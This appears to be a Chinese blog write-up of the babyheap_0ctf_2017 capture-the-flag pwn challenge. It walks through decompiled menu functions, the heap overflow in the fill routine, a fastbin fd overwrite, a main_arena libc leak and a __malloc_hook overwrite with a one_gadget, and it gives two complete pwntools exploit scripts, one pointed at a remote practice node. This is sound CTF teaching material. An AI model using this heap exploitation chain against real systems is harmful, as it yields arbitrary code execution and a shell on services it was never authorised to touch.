+++
title = "wp"
date = "2026-04-15"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-2', '2-2-2']
draft = false
+++
#### 选择1：
```c
void __fastcall allocate(__int64 a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = gets();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;//限制元素个数为4096
        v3 = calloc(v2, 1u);//限制堆大小为4096字节，4kb
        if ( !v3 )  //这个部分是负责写入元数据
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;//标记为已使用，设置第 i 个 chunk 的 "used" 标志为 1（表示已分配）
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;// 保存 size，在偏移 +8 处存入用户请求的 size（例如 128）
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;// 保存指针，在偏移 +16 处存入 calloc 返回的实际堆内存地址（如 0x5555555592a0）
        printf("Allocate Index %d\n", i);
      }
      return;
    }
  }
}
```
申请一个堆块

#### 选择2：
```c
__int64 __fastcall fill(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = gets();
  v2 = result;
  if ( (unsigned int)result < 0x10 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )      //是否已分配
    {
      printf("Size: ");
      result = gets();   //实际应该是scanf（“%d”），这种gets（）到int中的一般是反编译失真
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);//这里没有进行边界检查，是基础的堆溢出
      }
    }
  }
  return result;
}
```
其中`sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3)`如下，是一个非常友好的输入函数，无截断，支持大输入，信号安全，不添加终止符：
```c
unsigned __int64 __fastcall sub_11B2(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v3; // [rsp+10h] [rbp-10h]
  ssize_t v4; // [rsp+18h] [rbp-8h]

  if ( !a2 )
    return 0;
  v3 = 0;
  while ( v3 < a2 )
  {
    v4 = read(0, (void *)(v3 + a1), a2 - v3);
    if ( v4 > 0 )
    {
      v3 += v4;
    }
    else if ( *_errno_location() != 11 && *_errno_location() != 4 )
    {
      return v3;
    }
  }
  return v3;
}
```

#### 选择3：
```c
__int64 __fastcall freee(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = gets();
  v2 = result;
  if ( (unsigned int)result < 0x10 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0;
    }
  }
  return result;
}
```
作用是清空对应的堆块

#### 选择4：
```c
int __fastcall dump(__int64 a1)
{
  int result; // eax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = gets();
  v2 = result;
  if ( (unsigned int)result < 0x10 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16),);//输出从*(_QWORD *)(24LL * v2 + a1 + 16)开始 *(_QWORD *)(24LL * v2 + a1 + 8)个字符
      return puts(byte_14F1);
    }
  }
  return result;
}
```
其中`sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8))`跟前面的输入函数一样是一个很友好的输出函数：
```c
unsigned __int64 __fastcall sub_130F(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v3; // [rsp+10h] [rbp-10h]
  ssize_t v4; // [rsp+18h] [rbp-8h]

  v3 = 0;
  while ( v3 < a2 )
  {
    v4 = write(1, (const void *)(v3 + a1), a2 - v3);
    if ( v4 > 0 )
    {
      v3 += v4;
    }
    else if ( *_errno_location() != 11 && *_errno_location() != 4 )
    {
      return v3;
    }
  }
  return v3;
}
```
#### 选择5：
return 0；

### 利用：
神仙发言仅作参考：(不过他的动调写的还挺好：babyheap_0ctf_2017-CSDN博客)
==堆题的做法无非就是利用各种绕过去获得libc的偏移，然后去修改malloc_hook或者free_hook为system函数，最后去触发获取shell==
不过对于前期应该没什么问题。他的函数定义也挺好
```python
def dbg():
    gdb.attach(p)
    pause()
 
def add(size):
    p.sendlineafter("Command: ",str(1))
    p.sendlineafter("Size: ",str(size))
 
def edit(index, content):
    p.sendlineafter("Command: ",str(2))
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter("Size: ",str(len(content)))
    p.sendafter("Content: ",content)
 
def free(index):
    p.sendlineafter("Command: ",str(3))
    p.sendlineafter("Index: ",str(index))
 
def show(index):
    p.sendlineafter("Command: ",str(4))
    p.sendlineafter("Index: ",str(index))

#————————————————
#版权声明：本文为CSDN博主「djhtdjdywgjc」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
#原文链接：https://blog.csdn.net/djhtdjdywgjc/article/details/129701870
```


---
### 利用思路：
（1）搞几个堆块
（2）uaf改fd，想办法输出什么地址搞到libcbase
（3）用malloc_hook来getshell
至于exploit中的mainarena说白了就是大于0x80的chunk释放之后存到unsortedbin中时fd指针存在了mainarena+0x58也就是mainarena+88中。详见main_arena + 88是什么
关于libc的泄露还可以参考
泄露libc地址的原理详解--以babyheap_0ctf_2017为例
那个神秘的0x4526a是onegaget:one_gadget,它不是一个函数名，而是一个 **在特定版本的 libc 中，能直接执行 `/bin/sh` 的“魔法地址**

---
### exp1：
```python
from pwn import*
from LibcSearcher import*
context(log_level='debug',arch='amd64')
p=process('./babyheap')
#p=remote('node5.buuoj.cn',27442)
def alloc(size):
    p.sendlineafter(b'Command:',str(1))
    p.sendlineafter(b'Size:',str(size))
 
def fill(index,size,content):
    p.sendlineafter(b'Command:',str(2))
    p.sendlineafter(b'Index:',str(index))
    p.sendlineafter(b'Size:',str(size))
    p.sendafter(b'Content:',content)
 
def free(index):
    p.sendlineafter(b'Command:',str(3))
    p.sendlineafter(b'Index:',str(index))
 
def dump(index):
    p.sendlineafter(b'Command:',str(4))
    p.sendlineafter(b'Index:',str(index))
 
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)
free(1)
free(2)
payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
fill(0,len(payload),payload)
payload=p64(0)*3+p64(0x21)
fill(3,len(payload),payload)
alloc(0x10)
alloc(0x10)
payload=p64(0)*3+p64(0x91)
fill(3,len(payload),payload)
alloc(0x80)
free(4)
dump(2)
mainarena88=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
mainarena=mainarena88-88
malloc_hook=mainarena-0x10
libc=LibcSearcher('__malloc_hook',malloc_hook)
libcbase=malloc_hook-libc.dump('__malloc_hook')
alloc(0x60)
free(4)
payload=p64(malloc_hook-35)
fill(2,len(payload),payload)
alloc(0x60)
alloc(0x60)
system=libcbase+0x4526a
payload=p64(0)*2+p8(0)*3+p64(system)
fill(6,len(payload),payload)
alloc(1)
p.interactive()
```

### exp2:
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'
context(os='linux', arch='amd64',log_level='debug')
 
# p = process('./babyheap')
p=remote('node4.buuoj.cn',27874)
elf = ELF('./babyheap')
libc = ELF('./libc-2.23.so')
 
def dbg():
    gdb.attach(p)
    pause()
 
def add(size):
    p.sendlineafter("Command: ",str(1))
    p.sendlineafter("Size: ",str(size))
 
def edit(index, content):
    p.sendlineafter("Command: ",str(2))
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter("Size: ",str(len(content)))
    p.sendafter("Content: ",content)
 
def free(index):
    p.sendlineafter("Command: ",str(3))
    p.sendlineafter("Index: ",str(index))
 
def show(index):
    p.sendlineafter("Command: ",str(4))
    p.sendlineafter("Index: ",str(index))
 
add(0x10)   #0
add(0x10)   #1
add(0x10)   #2
add(0x10)   #3
add(0x80)   #4
free(1)
free(2)
payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
edit(0,payload)
payload=p64(0)*3+p64(0x21)
edit(3,payload)
add(0x10)   #4  2
add(0x10)   #2  1
payload=p64(0)*3+p64(0x91)
edit(3,payload)
add(0x80)   #5  
free(4)
show(2)
malloc_hook=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-88-0x10
print(hex(malloc_hook))
base=malloc_hook-libc.symbols['__malloc_hook']
print(hex(base))
system=0x4526a+base
add(0x60)   #4
free(4)
payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
edit(3,payload)
add(0x60)   #4
add(0x60)   #6
payload=0x13*b'a'+p64(system)
edit(6,payload)
add(0x20)
# dbg()
p.interactive()

```

### 堆简单的利用：
首先申请几个堆块，比方说5个。
free第二第三个chunk，在第一个chunk中存数据完成UAF，更改第三个chunk的fd指向第四个chunk。
再次申请两个chunk，也就是重新申请第二第三个chunk。
再free第四个chunk。此时dump第二个chunk拿到第四个chunk的fd，以此搞到libc_base.
借libc_base和malloc_hook获取shell（这部分有点神秘，没见binsh，一个system到底是怎么搞到shell的）


# 补上实践的过程。
#### 如果不加add（80）确实会和topchunk合并
Pasted image 20260407201547.png
#### 实操时libc版本还是libcsearcher比较稳定。
